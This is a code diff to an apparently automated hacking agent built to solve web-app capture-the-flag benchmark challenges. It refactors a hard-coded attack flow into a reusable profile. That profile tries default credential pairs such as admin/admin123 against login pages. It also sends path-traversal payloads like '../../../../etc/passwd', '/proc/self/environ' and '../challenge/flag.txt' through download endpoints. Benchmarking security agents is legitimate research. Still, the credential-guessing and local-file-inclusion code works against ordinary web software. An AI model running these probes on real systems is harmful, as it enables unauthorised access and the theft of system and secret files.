@@ -702,8 +702,11 @@ class FourPillarPipeline:
         )
         if match:
             return match.group(1)
-        match = _re_mod.search(r"\b(xben-\d+-\d+)\b", text)
-        return match.group(1) if match else None
+        match = _re_mod.search(
+            r"\b(?=[A-Za-z0-9-]*\d)[A-Za-z][A-Za-z0-9]*(?:-[A-Za-z0-9]+)+\b",
+            text,
+        )
+        return match.group(0) if match else None
 
     def _benchmark_known_unique_codes(self) -> set[str]:
         codes: set[str] = set()
@@ -2292,11 +2295,12 @@ class FourPillarPipeline:
         bounded follow-up pass.
         """
         lowered = probe.lower()
-        if not any(marker in lowered for marker in ("login", "登录", "测试账号", "test account")):
+        profile = self._benchmark_matching_webapp_flow_profile(lowered)
+        if not profile:
             return ""
         credentials = self._benchmark_extract_demo_credentials(probe)
         if not credentials:
-            credentials = self._benchmark_default_web_credentials()
+            credentials = list(profile.get("credentials") or [])
         tun_interface = self._benchmark_tun_interface()
         cookie_file = tempfile.NamedTemporaryFile(prefix="cyber-agent-bench-", suffix=".cookies", delete=False)
         cookie_path = cookie_file.name
@@ -2325,6 +2329,7 @@ class FourPillarPipeline:
                     tun_interface,
                     cookie_path,
                     probe,
+                    profile,
                 )
                 if auth_output:
                     outputs.append(auth_output)
@@ -2338,6 +2343,65 @@ class FourPillarPipeline:
             except OSError:
                 pass
         return "\n".join(outputs)
+
+    @classmethod
+    def _benchmark_matching_webapp_flow_profile(
+        cls,
+        lowered_probe: str,
+    ) -> dict[str, Any] | None:
+        for profile in cls._benchmark_webapp_flow_profiles():
+            indicators = profile.get("indicators") or ()
+            if any(str(marker).lower() in lowered_probe for marker in indicators):
+                return profile
+        return None
+
+    @staticmethod
+    def _benchmark_webapp_flow_profiles() -> list[dict[str, Any]]:
+        return [
+            {
+                "name": "form-login-and-file-download",
+                "indicators": (
+                    "login",
+                    "登录",
+                    "测试账号",
+                    "test account",
+                    "<form",
+                    "name=\"password\"",
+                    "name='password'",
+                ),
+                "credentials": (
+                    ("admin", "admin123"),
+                    ("employee", "employee123"),
+                    ("admin", "admin"),
+                    ("admin", "password"),
+                    ("test", "test"),
+                    ("user", "password"),
+                ),
+                "authenticated_paths": (
+                    "",
+                    "dashboard.php",
+                    "admin",
+                    "download.php",
+                    "upload.php",
+                ),
+                "handoff_paths": (
+                    "api/approve.php",
+                    "api/approval.php",
+                    "api/review.php",
+                    "approve.php",
+                    "approval.php",
+                    "review.php",
+                    "contract_approval.php",
+                    "admin_approve.php",
+                    "download.php?id=init_config.txt",
+                    "download.php?id=system-init-config",
+                    "download.php?id=../../../../challenge/flag.txt",
+                    "download.php?id=../../../../var/www/html/contracts/flag.txt",
+                    "download.php?id=../../../../var/www/html/contracts/init_config.txt",
+                    "download.php?id=../../../../var/www/html/logs/app.log",
+                ),
+            }
+        ]
 
     @staticmethod
     def _benchmark_extract_demo_credentials(text: str) -> list[tuple[str, str]]:
@@ -2377,14 +2441,8 @@ class FourPillarPipeline:
 
     @staticmethod
     def _benchmark_default_web_credentials() -> list[tuple[str, str]]:
-        return [
-            ("admin", "admin123"),
-            ("employee", "employee123"),
-            ("admin", "admin"),
-            ("admin", "password"),
-            ("test", "test"),
-            ("user", "password"),
-        ]
+        profile = FourPillarPipeline._benchmark_webapp_flow_profiles()[0]
+        return list(profile["credentials"])
 
     def _benchmark_login_url_from_probe(self, base: str, probe: str) -> str:
         for action in _re_mod.findall(
@@ -2405,14 +2463,13 @@ class FourPillarPipeline:
         tun_interface: str,
         cookie_path: str,
         seed_probe: str,
+        profile: dict[str, Any] | None = None,
     ) -> str:
         outputs: list[str] = []
+        active_profile = profile or self._benchmark_webapp_flow_profiles()[0]
         queue: list[str] = [
-            base,
-            _urljoin(base, "dashboard.php"),
-            _urljoin(base, "admin"),
-            _urljoin(base, "download.php"),
-            _urljoin(base, "upload.php"),
+            _urljoin(base, str(path))
+            for path in active_profile.get("authenticated_paths", ())
         ]
         for derived in self._benchmark_derive_probe_urls(base, seed_probe):
             queue.append(derived)
@@ -2529,8 +2586,8 @@ class FourPillarPipeline:
         return urls[:80]
 
     @staticmethod
-    def _benchmark_lfi_candidate_paths(text: str) -> list[str]:
-        common = [
+    def _benchmark_lfi_base_paths() -> list[str]:
+        return [
             "../../../../etc/passwd",
             "../../../../challenge/flag.txt",
             "../../../../challenge/flag",
@@ -2554,6 +2611,9 @@ class FourPillarPipeline:
             "../../../../var/www/html/logs/app.log",
             "../../../../proc/self/environ",
         ]
+
+    @staticmethod
+    def _benchmark_lfi_discovered_paths(text: str) -> list[str]:
         discovered: list[str] = []
         for raw in _re_mod.findall(r"""['"]([A-Za-z0-9_.-]+\.(?:txt|pdf|docx?|xlsx?|log|conf|php|json|ya?ml))['"]""", text):
             discovered.extend([raw, f"../../../../var/www/html/contracts/{raw}", f"../../../../var/www/html/uploads/{raw}"])
@@ -2561,7 +2621,16 @@ class FourPillarPipeline:
             for suffix in ("", ".pdf", ".txt"):
                 discovered.append(f"{raw}{suffix}")
                 discovered.append(f"../../../../var/www/html/contracts/{raw}{suffix}")
-        return list(dict.fromkeys(common + discovered))[:80]
+        return discovered
+
+    @classmethod
+    def _benchmark_lfi_candidate_paths(cls, text: str) -> list[str]:
+        return list(
+            dict.fromkeys(
+                cls._benchmark_lfi_base_paths()
+                + cls._benchmark_lfi_discovered_paths(text)
+            )
+        )[:80]
 
     @staticmethod
     def _benchmark_probe_suggests_raw_text_protocol(probe: str) -> bool:
@@ -2773,7 +2842,8 @@ class FourPillarPipeline:
         cookie_file.close()
         try:
             # Known demo/admin credentials are common in these benchmark web apps.
-            for username, password in self._benchmark_default_web_credentials()[:4]:
+            web_profile = self._benchmark_webapp_flow_profiles()[0]
+            for username, password in list(web_profile.get("credentials") or [])[:4]:
                 self._benchmark_curl_local(
                     _urljoin(base, "login.php"),
                     tun_interface=tun_interface,
@@ -2782,22 +2852,7 @@ class FourPillarPipeline:
                     data={"username": username, "password": password},
                     timeout=6,
                 )
-                for path in (
-                    "api/approve.php",
-                    "api/approval.php",
-                    "api/review.php",
-                    "approve.php",
-                    "approval.php",
-                    "review.php",
-                    "contract_approval.php",
-                    "admin_approve.php",
-                    "download.php?id=init_config.txt",
-                    "download.php?id=system-init-config",
-                    "download.php?id=../../../../challenge/flag.txt",
-                    "download.php?id=../../../../var/www/html/contracts/flag.txt",
-                    "download.php?id=../../../../var/www/html/contracts/init_config.txt",
-                    "download.php?id=../../../../var/www/html/logs/app.log",
-                ):
+                for path in web_profile.get("handoff_paths", ()):
                     url = _urljoin(base, path)
                     result = self._benchmark_curl_local(
                         url,
